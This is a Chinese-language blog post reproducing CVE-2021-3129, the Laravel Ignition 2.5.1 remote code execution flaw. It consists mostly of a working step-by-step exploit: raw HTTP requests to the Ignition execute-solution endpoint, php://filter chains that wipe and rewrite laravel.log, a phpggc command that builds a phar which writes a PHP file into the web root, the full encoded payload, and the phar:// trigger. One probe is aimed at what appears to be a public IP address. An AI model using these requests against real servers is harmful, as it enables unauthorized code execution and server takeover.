---
layout:     post   				    # 使用的布局（不需要改）
title:      Laravel Ignition 2.5.1 代码执行漏洞复现 				# 标题 
subtitle:   Laravel Ignition 2.5.1 代码执行漏洞复现
date:       2025-05-07 				# 时间
author:     appleszk 						# 作者
header-img: img/post-bg-rwd.jpg 	#这篇文章标题背景图片
catalog: true 						# 是否归档
tags:								#标签
    - Laravel
    - 漏洞复现
---
# Laravel Ignition 2.5.1 代码执行漏洞复现
>Laravel 是一个免费的开源 PHP Web 框架，旨在实现的Web软件的MVC架构。2021年1月13日，阿里云应急响应中心监控到国外某安全研究团队披露了 Laravel <= 8.4.2 存在远程代码执行漏洞。当Laravel开启了Debug模式时，由于Laravel自带的Ignition功能的某些接口存在过滤不严，攻击者可以发起恶意请求，通过构造恶意Log文件等方式触发Phar反序列化，从而造成远程代码执行，控制服务器。漏洞细节已在互联网公开。阿里云应急响应中心提醒 Laravel 用户尽快采取安全措施阻止漏洞攻击。




## Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）

是否有漏洞

```
POST /_ignition/execute-solution HTTP/1.1
Host: 124.104.149.126
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Connection: close
Content-Type: application/json
Content-Length: 167
 
{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "xxxxxx"
  }
}
```

> [!CAUTION]
> 
> 页面返回500并出现了Ignition的报错说明漏洞存在。

## 漏洞复现

### 清空日志

```
POST /_ignition/execute-solution HTTP/1.1
Host: 192.168.121.135:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 328

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
  }
}
```

报200错误

### 增加前缀

```
POST /_ignition/execute-solution HTTP/1.1
Host: 192.168.121.135:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 163

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "AA"
  }
}
```

报500错误

#### 在phpggc目录执行命令，生成payload

```
php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "system('echo PD9waHAgcGhwaW5mbygpOyA/Pg==|base64 -d > /var/www/html/shell.php');" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
```

注意绝对路径

### 发送利用pyaload

```
POST /_ignition/execute-solution HTTP/1.1
Host: 192.168.121.135:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Connection: close
Content-Type: application/json
Content-Length: 5322

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=36=00=42=00=41=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=45=00=42=00=41=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=32=00=4E=00=6A=00=41=00=36=00=49=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=67=00=6E=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=51=00=52=00=44=00=6C=00=33=00=59=00=55=00=68=00=42=00=53=00=31=00=70=00=58=00=54=00=6D=00=39=00=69=00=65=00=55=00=4A=00=30=00=57=00=6B=00=52=00=56=00=62=00=30=00=6F=00=79=00=52=00=6D=00=6C=00=6B=00=55=00=32=00=4E=00=77=00=54=00=33=00=64=00=77=00=61=00=6D=00=4A=00=48=00=52=00=6E=00=70=00=6A=00=65=00=55=00=4A=00=6D=00=51=00=32=00=35=00=7A=00=53=00=30=00=6C=00=44=00=51=00=57=00=64=00=4A=00=53=00=45=00=34=00=77=00=57=00=56=00=68=00=53=00=63=00=46=00=6C=00=35=00=51=00=6E=00=64=00=6B=00=56=00=30=00=70=00=7A=00=59=00=56=00=64=00=4E=00=5A=00=30=00=70=00=49=00=51=00=6D=00=39=00=6A=00=52=00=30=00=35=00=30=00=59=00=33=00=6F=00=78=00=54=00=32=00=52=00=58=00=65=00=48=00=4E=00=50=00=64=00=32=00=39=00=6E=00=53=00=55=00=4E=00=42=00=5A=00=31=00=70=00=75=00=56=00=6E=00=56=00=5A=00=4D=00=31=00=4A=00=77=00=59=00=6A=00=49=00=30=00=5A=00=31=00=67=00=78=00=4F=00=57=00=70=00=69=00=4D=00=6A=00=56=00=36=00=5A=00=45=00=68=00=4B=00=4D=00=56=00=6B=00=7A=00=55=00=57=00=39=00=4B=00=52=00=33=00=63=00=35=00=53=00=57=00=31=00=57=00=65=00=57=00=4E=00=74=00=4F=00=58=00=6C=00=4A=00=61=00=57=00=77=00=33=00=51=00=32=00=6C=00=42=00=5A=00=30=00=6C=00=44=00=51=00=57=00=64=00=4A=00=51=00=30=00=46=00=6E=00=59=00=7A=00=4A=00=57=00=63=00=31=00=70=00=71=00=62=00=7A=00=5A=00=4B=00=53=00=45=00=4A=00=76=00=59=00=30=00=64=00=4F=00=64=00=47=00=4E=00=36=00=4D=00=47=00=74=00=69=00=52=00=48=00=4E=00=4C=00=53=00=55=00=4E=00=42=00=5A=00=30=00=6C=00=44=00=51=00=57=00=64=00=4A=00=51=00=30=00=4A=00=42=00=57=00=6C=00=68=00=61=00=61=00=47=00=4A=00=44=00=4F=00=48=00=46=00=53=00=52=00=31=00=5A=00=74=00=59=00=56=00=63=00=31=00=63=00=47=00=4A=00=74=00=59=00=32=00=64=00=61=00=57=00=45=00=70=00=35=00=59=00=6A=00=4E=00=4A=00=5A=00=32=00=4A=00=48=00=56=00=6A=00=4A=00=61=00=56=00=33=00=64=00=6E=00=59=00=6A=00=4A=00=61=00=62=00=56=00=70=00=58=00=4E=00=57=00=70=00=61=00=57=00=45=00=31=00=78=00=54=00=48=00=6C=00=6F=00=64=00=57=00=52=00=58=00=65=00=48=00=4E=00=4D=00=62=00=54=00=55=00=78=00=59=00=6B=00=64=00=33=00=64=00=57=00=4D=00=79=00=56=00=6E=00=4E=00=61=00=61=00=6D=00=38=00=32=00=53=00=6B=00=68=00=43=00=62=00=32=00=4E=00=48=00=54=00=6E=00=52=00=6A=00=65=00=57=00=73=00=33=00=51=00=32=00=6C=00=42=00=5A=00=30=00=6C=00=44=00=51=00=6A=00=6C=00=44=00=62=00=6A=00=42=00=4C=00=57=00=6D=00=35=00=57=00=64=00=56=00=6B=00=7A=00=55=00=6E=00=42=00=69=00=4D=00=6A=00=52=00=6E=00=59=00=55=00=64=00=57=00=4E=00=46=00=5A=00=48=00=4F=00=56=00=52=00=6B=00=53=00=45=00=6C=00=76=00=53=00=6B=00=64=00=6F=00=62=00=47=00=56=00=44=00=62=00=44=00=64=00=4A=00=51=00=30=00=46=00=6E=00=51=00=32=00=6C=00=42=00=5A=00=30=00=6C=00=44=00=51=00=57=00=64=00=4A=00=51=00=30=00=46=00=6E=00=53=00=6B=00=68=00=4F=00=4D=00=47=00=4E=00=71=00=4D=00=47=00=6C=00=4A=00=61=00=6E=00=4E=00=4C=00=53=00=55=00=4E=00=42=00=5A=00=30=00=6C=00=44=00=51=00=57=00=64=00=4A=00=51=00=30=00=4A=00=74=00=59=00=6A=00=4E=00=4A=00=62=00=30=00=70=00=48=00=61=00=7A=00=6C=00=4E=00=52=00=48=00=4E=00=72=00=59=00=56=00=52=00=34=00=65=00=6D=00=52=00=49=00=53=00=6E=00=4E=00=61=00=56=00=7A=00=52=00=76=00=53=00=6B=00=64=00=6F=00=62=00=47=00=56=00=44=00=61=00=33=00=52=00=4E=00=56=00=48=00=4E=00=72=00=59=00=56=00=4E=00=7A=00=4F=00=55=00=31=00=70=00=61=00=30=00=74=00=4A=00=51=00=30=00=46=00=6E=00=53=00=55=00=4E=00=42=00=5A=00=30=00=6C=00=44=00=51=00=57=00=74=00=6A=00=4D=00=31=00=4A=00=35=00=54=00=47=00=6F=00=78=00=61=00=6D=00=46=00=49=00=53=00=57=00=39=00=68=00=52=00=31=00=59=00=30=00=57=00=6B=00=64=00=57=00=61=00=6B=00=74=00=44=00=55=00=6D=00=39=00=61=00=57=00=47=00=68=00=69=00=53=00=6B=00=64=00=73=00=5A=00=45=00=78=00=70=00=55=00=6D=00=39=00=61=00=57=00=47=00=68=00=69=00=53=00=6B=00=64=00=72=00=63=00=6B=00=31=00=57=00=4D=00=48=00=42=00=4C=00=56=00=48=00=4E=00=4C=00=53=00=55=00=4E=00=42=00=5A=00=30=00=6C=00=44=00=51=00=57=00=64=00=4A=00=51=00=30=00=4A=00=35=00=57=00=6C=00=68=00=53=00=4D=00=57=00=4E=00=74=00=4E=00=47=00=64=00=4A=00=51=00=31=00=4A=00=36=00=5A=00=45=00=68=00=4A=00=4E=00=30=00=4E=00=70=00=51=00=57=00=64=00=4A=00=51=00=30=00=49=00=35=00=51=00=32=00=6C=00=53=00=62=00=47=00=4E=00=75=00=53=00=6E=00=5A=00=6A=00=61=00=55=00=45=00=35=00=53=00=55=00=63=00=31=00=4D=00=57=00=4A=00=48=00=64=00=33=00=56=00=68=00=52=00=31=00=59=00=30=00=56=00=6B=00=63=00=35=00=56=00=47=00=52=00=49=00=53=00=57=00=39=00=52=00=51=00=31=00=4A=00=6D=00=56=00=55=00=55=00=35=00=56=00=46=00=5A=00=44=00=4F=00=48=00=46=00=59=00=51=00=32=00=39=00=32=00=56=00=33=00=6C=00=4A=00=65=00=45=00=31=00=71=00=54=00=57=00=6C=00=59=00=55=00=32=00=73=00=33=00=51=00=32=00=6C=00=53=00=61=00=30=00=6C=00=45=00=4D=00=47=00=64=00=69=00=62=00=56=00=59=00=7A=00=53=00=55=00=59=00=34=00=62=00=30=00=70=00=48=00=56=00=6E=00=6C=00=6A=00=62=00=54=00=6C=00=35=00=53=00=31=00=52=00=7A=00=53=00=31=00=42=00=36=00=4E=00=44=00=31=00=38=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=49=00=43=00=31=00=6B=00=49=00=44=00=34=00=67=00=4C=00=33=00=5A=00=68=00=63=00=69=00=39=00=33=00=64=00=33=00=63=00=76=00=61=00=48=00=52=00=74=00=62=00=43=00=39=00=69=00=62=00=47=00=46=00=6A=00=61=00=32=00=52=00=79=00=5A=00=58=00=4E=00=7A=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=63=00=70=00=4F=00=79=00=42=00=6C=00=65=00=47=00=6C=00=30=00=4F=00=79=00=41=00=2F=00=50=00=69=00=49=00=37=00=66=00=58=00=31=00=39=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=4D=00=72=00=6B=00=79=00=57=00=59=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=42=00=79=00=77=00=6D=00=4F=00=53=00=57=00=61=00=6A=00=39=00=38=00=6A=00=4F=00=61=00=2F=00=72=00=44=00=4F=00=47=00=63=00=4F=00=34=00=62=00=65=00=75=00=66=00=63=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a"
  }
}
```

nmb要加个a 不然不行，报500错误

### 发送数据包 对log文件清理

```
POST /_ignition/execute-solution HTTP/1.1
Host: 192.168.121.135:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 299

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
  }
}
```

报200 不报200多执行几次

### 使用phar://进行反序列化，执行任意代码

**Linux**

```
POST /_ignition/execute-solution HTTP/1.1
Host: 192.168.121.135:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 210

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "phar:///var/www/storage/logs/laravel.log/test.txt"
  }
}
```

```
1.实际利用需要调整绝对路径 

2.Windows需要调整"viewFile"中的UNC符也就是"/"->"\"
```


)
